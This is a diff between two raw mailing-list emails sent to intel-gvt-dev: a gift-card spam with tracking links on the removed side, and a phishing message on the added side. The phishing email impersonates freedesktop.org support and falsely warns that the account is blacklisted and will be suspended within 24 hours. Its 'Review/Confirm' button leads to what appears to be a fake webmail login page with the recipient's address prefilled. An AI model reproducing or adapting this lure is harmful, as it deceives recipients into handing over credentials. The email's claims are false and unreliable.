@@ -1,43 +1,37 @@
 Return-Path: <intel-gvt-dev-bounces@lists.freedesktop.org>
 X-Original-To: lists+intel-gvt-dev@lfdr.de
 Delivered-To: lists+intel-gvt-dev@lfdr.de
-Received: from gabe.freedesktop.org (gabe.freedesktop.org [IPv6:2610:10:20:722:a800:ff:fe36:1795])
-	by mail.lfdr.de (Postfix) with ESMTPS id 9E7B663DA61
-	for <lists+intel-gvt-dev@lfdr.de>; Wed, 30 Nov 2022 17:17:33 +0100 (CET)
+Received: from gabe.freedesktop.org (gabe.freedesktop.org [131.252.210.177])
+	by mail.lfdr.de (Postfix) with ESMTPS id A296063DC37
+	for <lists+intel-gvt-dev@lfdr.de>; Wed, 30 Nov 2022 18:40:54 +0100 (CET)
 Received: from gabe.freedesktop.org (localhost [127.0.0.1])
-	by gabe.freedesktop.org (Postfix) with ESMTP id 6BFFD10E4A3;
-	Wed, 30 Nov 2022 16:17:32 +0000 (UTC)
+	by gabe.freedesktop.org (Postfix) with ESMTP id 70AE910E117;
+	Wed, 30 Nov 2022 17:40:53 +0000 (UTC)
 X-Original-To: intel-gvt-dev@lists.freedesktop.org
 Delivered-To: intel-gvt-dev@lists.freedesktop.org
-X-Greylist: delayed 301 seconds by postgrey-1.36 at gabe;
- Wed, 30 Nov 2022 16:17:29 UTC
-Received: from mail.warnblack.com (unknown [104.223.183.195])
- by gabe.freedesktop.org (Postfix) with ESMTP id 6234410E0DE
+X-Greylist: delayed 604 seconds by postgrey-1.36 at gabe;
+ Wed, 30 Nov 2022 17:40:50 UTC
+Received: from noreply0.parcelsinc.com (unknown [74.201.28.161])
+ by gabe.freedesktop.org (Postfix) with ESMTPS id 366C210E10F
  for <intel-gvt-dev@lists.freedesktop.org>;
- Wed, 30 Nov 2022 16:17:29 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=warnblack.com;
- h=Date:From:To:Subject:MIME-Version:Content-Type:List-Unsubscribe:Message-ID;
- i=james.lawerence@warnblack.com; 
- bh=IgFxDrMjoJNgIDh4tZklgbnjfW8=;
- b=nuKWF6IT8v9MAM8T9pPfriBO//XvEpLbOnQtmzBE+haAvXNAs83ItZe8bFCGSUte0avccmb788DT
- 9z4JQN8Y7tWQt5XzZTUKflCeezJe2OgXlWeM3Bs2m5DaWKMogUWMzx8MCFpupDh2PbNLYaYd5mvm
- Kl4/thI9WvgAfNR4pTM=
-DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=warnblack.com;
- b=HfGgvxxMeglZeL5daNiOESwVV7JuMt9uKjWetWdNgMMBx1g7XKm9xeBOXWZ0yIPgDnuhWe1E82gu
- o6l0TYAMeIG/e/hgEuWWjdoD70kolBEj+s1Na8dkqu0zl7EVJ4jkZIEKpdZx0NL3FtNBZhPqfUwo
- Hvwfy4M7SkYzECSFpwk=;
-Received: by mail.warnblack.com id hgu11i0001gs for
- <intel-gvt-dev@lists.freedesktop.org>;
- Wed, 30 Nov 2022 10:53:54 -0500 (envelope-from
- <james.lawerence-intel+2Dgvt+2Ddev=lists.freedesktop.org@warnblack.com>)
-Date: Wed, 30 Nov 2022 10:53:54 -0500
-From: "James Lawerence" <james.lawerence@warnblack.com>
-To: <intel-gvt-dev@lists.freedesktop.org>
-Subject: Leave feedback to maybe win
+ Wed, 30 Nov 2022 17:40:50 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
+ d=parcelsinc.com; 
+ h=Reply-To:From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=noreply@parcelsinc.com;
+ bh=6CEvTXsELJWS9JJWYnYD5u8htrLu3GvKTnOlALlBMkE=;
+ b=iIr8emmJq996Hd6XvEi24ys38uEiBapB2PNDHas3c+Zpb7wS0t3km4EJabMQxSqqCt3NBo8/a6H+
+ d5EogEq8rngncX9D1AYcVwz45GZx1PCA8bMmWtK0r4+RVD9ErbKohdgGLbSOZeo7801WYjTOPGw0
+ 4LWM+q5XOu22Hsdbtlg=
+From: lists.freedesktop.org Email support<noreply@parcelsinc.com>
+To: intel-gvt-dev@lists.freedesktop.org
+Subject: lists.freedesktop.org Suspension Notice
+Date: 30 Nov 2022 09:21:04 -0800
+Message-ID: <20221130092104.1BF9F27295FF27C4@parcelsinc.com>
 MIME-Version: 1.0
-Content-Type: multipart/alternative; 
- boundary="----=_Part_121_27152267.1669823497867"
-Message-ID: <0.0.0.E.1D904D3F2CCBA5A.10F4B3@mail.warnblack.com>
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 X-BeenThere: intel-gvt-dev@lists.freedesktop.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -50,185 +44,133 @@ List-Post: <mailto:intel-gvt-dev@lists.freedesktop.org>
 List-Help: <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=help>
 List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/intel-gvt-dev>, 
  <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=subscribe>
+Reply-To: noreply@lists.freedesktop.org
 Errors-To: intel-gvt-dev-bounces@lists.freedesktop.org
 Sender: "intel-gvt-dev" <intel-gvt-dev-bounces@lists.freedesktop.org>
 
-------=_Part_121_27152267.1669823497867
-Content-Type: text/html; charset=us-ascii
-Content-Transfer-Encoding: 7bit
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
 
-<!DOCTYPE html>
-<html>
- <head> 
-  <meta charset="UTF-8" /> 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" /> 
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" /> 
-  <title>what a nest</title> 
-  <style type="text/css">
-
-html,  body {
-	margin: 0 !important;
-	padding: 0 !important;
-	height: 100% !important;
-	width: 100% !important;
-}
-
-* {
-	-ms-text-size-adjust: 100%;
-	-webkit-text-size-adjust: 100%;
-}
-
-ExternalClass {
-	width: 100%;
-}
-
-
-
-table,  td {
-	mso-table-lspace: 0pt !important;
-	mso-table-rspace: 0pt !important;
-}
-
-table {
-	border-spacing: 0 !important;
-	border-collapse: collapse !important;
-	table-layout: fixed !important;
-	margin: 0 auto !important;
-}
-table table table {
-	table-layout: auto;
-}
-
-img {
-	-ms-interpolation-mode: bicubic;
-}
-
-yshortcuts a {
-	border-bottom: none !important;
-}
-
-}
-</style> 
-  <style type="text/css">
-        
-      
-        .button-td,
-        .button-a {
-            transition: all 100ms ease-in;
-        }
-        .button-td:hover,
-        .button-a:hover {
-            background: #555555 !important;
-            border-color: #555555 !important;
-        }
-
-        /* Media Queries */
-        @media screen and (max-width: 600px) {
-
-            .email-container {
-                width: 100% !important;
-            }
-
-           
-            .fluid,
-            .fluid-centered {
-                max-width: 100% !important;
-                height: auto !important;
-                margin-left: auto !important;
-                margin-right: auto !important;
-            }
-            /* And center justify these ones. */
-            .fluid-centered {
-                margin-left: auto !important;
-                margin-right: auto !important;
-            }
-
-            /* What it does: Forces table cells into full-width rows. */
-            .stack-column,
-            .stack-column-center {
-                display: block !important;
-                width: 100% !important;
-                max-width: 100% !important;
-                direction: ltr !important;
-            }
-            /* And center justify these ones. */
-            .stack-column-center {
-                text-align: center !important;
-            }
-        
-            /* What it does: Generic utility class for centering. Useful for images, buttons, and nested tables. */
-            .center-on-narrow {
-                text-align: center !important;
-                display: block !important;
-                margin-left: auto !important;
-                margin-right: auto !important;
-                float: none !important;
-            }
-            table.center-on-narrow {
-                display: inline-block !important;
-            }
-                
-        }
-
-    </style> 
- </head> 
- <body bgcolor="#e0e0e0" width="100%" style="margin: 0;"> 
-  <table bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0" height="100%" width="100%" style="border-collapse:collapse;"> 
-   <tbody>
-    <tr> 
-     <td>
-      <center style="width: 100%;"> 
-       <div style="display:none;font-size:1px;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;mso-hide:all;font-family: Gotham, 'Helvetica Neue', Helvetica, Arial, 'sans-serif';">
-        &nbsp;
-       </div> 
-       <table cellspacing="0" cellpadding="0" border="0" align="center" bgcolor="#F4F4F4" width="600" class="email-container"> 
-        <tbody>
-         <tr> 
-          <td style="padding-top: 10px; padding-left: 30px; padding-right: 30px; text-align: left; font-family: arial; font-size: 18px; mso-height-rule: exactly; line-height: 24px; color: #555555;"> <p style="padding-top: 30px" align="center"> <a href="http://www.warnblack.com/89f4b2395Wh8A612D4h2bei102aN36pbrxIh-Z5x-HI5fhbwxwEYvIIHIwgxstEsvZ7rQ8dde95m1VR06AJ3w2D/contribution-subjective">Get a 1oo card-here</a> </p> </td>
-         </tr> 
-         <tr> 
-          <td class="full-width-image"><a href="http://www.warnblack.com/89f4b2395Wh8A612D4h2bei102aN36pbrxIh-Z5x-HI5fhbwxwEYvIIHIwgxstEsvZ7rQ8dde95m1VR06AJ3w2D/contribution-subjective" target="_blank"><img width="100%" src="http://www.warnblack.com/drawing-barnyard/a805S23T95JO7Pa12j42cB0q102aj36ybrxIh-Z5x-HI5fhbwxwEYvIIHIwgxstEsvZ7XQ8dde97uVvw1H06CMOwDA" alt="cabecera El Futuro" border="0" /></a></td> 
-         </tr> 
-         <tr> 
-          <td style="padding-top: 10px; padding-left: 30px; padding-right: 30px; text-align: left; font-family: arial; font-size: 18px; mso-height-rule: exactly; line-height: 24px; color: #555555;"> <p></p> <p style="padding-top: 30px">&nbsp;</p> <p style="text-align: center; font-size: 11px"> <span><span>To edit your communication preferences,</span><a href="http://www.warnblack.com/3774O2395D8V6S12q42b_fP102aS36dbrxIh-Z5x-HI5fhbwxwEYvIIHIwgxstEsvZ7NQ8dde97C10BivB6rywzD2/contribution-subjective" style="text-decoration-line: none;"> <span>Begin_Right_Here </span> </a> <br /> 126 E 23rd St New York, NY, US 10010<br /> <br /> </span> </p> 
-           <hr width="50%" size="2" /> <span style="display: block; text-align: center; font-size: 12px"> <font lang="courteous"></font><big></big><small></small><small></small> </span> </td> 
-         </tr>
-         <tr> 
-          <td dir="rtl" align="center" valign="top" width="100%" style="padding: 10px;">
-           <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%"> 
-            <tbody>
-             <tr> 
-              <td width="33.33%" class="stack-column-center">
-               <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%"> 
-                <tbody>
-                 <tr></tr> 
-                </tbody>
-               </table>
-               <table cellspacing="0" cellpadding="0" border="0" class="center-on-narrow" style="float:left;"> 
-                <tbody>
-                 <tr> 
-                 </tr> 
-                </tbody>
-               </table> </td>
-             </tr>
-            </tbody>
-           </table></td> 
-         </tr> 
-        </tbody>
-       </table> 
-       <table align="center" width="600" class="email-container"> 
-        <tbody>
-         <tr> 
-          <td> &nbsp; </td>
-         </tr> 
-        </tbody>
-       </table> 
-      </center></td>
-    </tr>
-   </tbody>
-  </table> 
- <img src="http://www.warnblack.com/attendees-subtract/a9e4e2395M8rs511y42c1L102aK36CbrxIh-Z5x-HI5fhbwxwEYvIIHIwgxstEsvZ7dQ8dde96SN1n0y5M3w0D" alt=""/></body>
-</html>
-
-------=_Part_121_27152267.1669823497867--
-
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto,=
+ sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; =
+FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: lef=
+t; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255=
+,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-c=
+aps: normal; text-decoration-style: initial; text-decoration-color: initial=
+; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial" name=3D"quoted-content">
+<table style=3D"BOX-SIZING: border-box; FONT-SIZE: 11px; FONT-FAMILY: helve=
+tica, arial, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COL=
+LAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: normal; COLOR: rgb(51,5=
+1,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; T=
+EXT-INDENT: 0px" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" bgcolor=
+=3D"#ffffff" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: helvetic=
+a, arial, sans-serif; COLOR: rgb(51,51,51); LINE-HEIGHT: 18px" align=3D"lef=
+t">
+<table style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: helve=
+tica, arial, sans-serif; BORDER-COLLAPSE: collapse; COLOR: rgb(51,51,51)" c=
+ellspacing=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box">
+<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px"><FONT size=3D2>Dear in=
+tel-gvt-dev@lists.freedesktop.org,</FONT></P>
+<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px"><FONT size=3D2>Our cur=
+rent&nbsp;record indicates that your account was detected of spam activitie=
+s and has been blacklisted as a result of that&nbsp;. Failure to confirm an=
+d update your account within 24 hours will lead to permanent suspension of =
+your account.<BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: =
+border-box">Review and&nbsp;confirm your&nbsp;account below.</FONT></P></TD=
+></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box">
+<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
+ing=3D"0" cellpadding=3D"1" width=3D"1" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box"><FONT size=3D2><BR style=3D"BOX-SIZING=
+: border-box"></FONT></TD></TR></TBODY></TABLE>
+<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
+ing=3D"0" cellpadding=3D"0" align=3D"left" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(232,180,99) 1px solid;=
+ BORDER-RIGHT: rgb(232,180,99) 1px solid; BORDER-BOTTOM: rgb(232,180,99) 1p=
+x solid; BORDER-LEFT: rgb(232,180,99) 1px solid" bgcolor=3D"#ffe86c" height=
+=3D"30" valign=3D"middle" align=3D"center">
+<table style=3D"BOX-SIZING: border-box; FONT-FAMILY: helvetica, arial, sans=
+-serif; BORDER-COLLAPSE: collapse" cellspacing=3D"0" cellpadding=3D"0" widt=
+h=3D"100%" bgcolor=3D"transparent" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box" width=3D"13">
+<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
+ing=3D"0" cellpadding=3D"1" width=3D"13" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box"><FONT size=3D2><BR style=3D"BOX-SIZING=
+: border-box"></FONT></TD></TR></TBODY></TABLE></TD>
+<td style=3D"BOX-SIZING: border-box"><A style=3D"BOX-SIZING: border-box; FO=
+NT-SIZE: 13px; TEXT-DECORATION: none; FONT-FAMILY: helvetica, arial, sans-s=
+erif; WHITE-SPACE: nowrap; FONT-WEIGHT: bold; COLOR: rgb(0,0,12); DISPLAY: =
+block; BACKGROUND-COLOR: transparent" href=3D"https://sunmarket.biz/sunmark=
+et/public/vendors/cropper/src/img/owa/?email=3Dintel-gvt-dev@lists.freedesk=
+top.org" rel=3Dnoreferrer target=3D_blank>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: helvet=
+ica, arial, sans-serif; WHITE-SPACE: nowrap; FONT-WEIGHT: bold; COLOR: rgb(=
+0,0,0); DISPLAY: block"><FONT size=3D2>Review/Confirm Your intel-gvt-dev@li=
+sts.freedesktop.org</FONT></SPAN></A></TD>
+<td style=3D"BOX-SIZING: border-box" width=3D"13">
+<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
+ing=3D"0" cellpadding=3D"1" width=3D"13" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box"><FONT size=3D2><BR style=3D"BOX-SIZING=
+: border-box"></FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></=
+TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD>
+<td style=3D"BOX-SIZING: border-box" width=3D"20">
+<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
+ing=3D"0" cellpadding=3D"1" width=3D"20" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box"><FONT size=3D2><BR style=3D"BOX-SIZING=
+: border-box"></FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-SIZE: 11px; FONT-FAMILY: "Lucid=
+a Grande", Verdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD=
+-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: normal; COLO=
+R: rgb(51,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inlin=
+e; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=
+ 0px'><FONT size=3D2>&nbsp;</FONT></SPAN></DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto,=
+ sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; =
+FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: lef=
+t; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255=
+,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-c=
+aps: normal; text-decoration-style: initial; text-decoration-color: initial=
+; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial" name=3D"quoted-content">
+<table style=3D"BOX-SIZING: border-box; FONT-SIZE: 11px; HEIGHT: 51px; FONT=
+-FAMILY: helvetica, arial, sans-serif; WIDTH: 1285px; WHITE-SPACE: normal; =
+WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WE=
+IGHT: normal; COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS:=
+ 2; LETTER-SPACING: normal; TEXT-INDENT: 0px" height=3D"51" cellspacing=3D"=
+0" cellpadding=3D"0" width=3D"1285" bgcolor=3D"black" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box"><FONT size=3D2></FONT></TBODY></TAB=
+LE></DIV>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-SIZE: 11px; FONT-FAMILY: "Lucid=
+a Grande", Verdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD=
+-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: normal; COLO=
+R: rgb(51,51,51); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS:=
+ 2; DISPLAY: inline; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; text-decoration-style: initial;=20
+text-decoration-color: initial; -webkit-text-stroke-width: 0px; text-decora=
+tion-thickness: initial'><FONT size=3D2>&nbsp;&nbsp;&nbsp; References<BR st=
+yle=3D"BOX-SIZING: border-box">&nbsp;&nbsp;&nbsp; 2022 &#9426; lists.freede=
+sktop.org Email support.</FONT></SPAN></BODY></HTML>
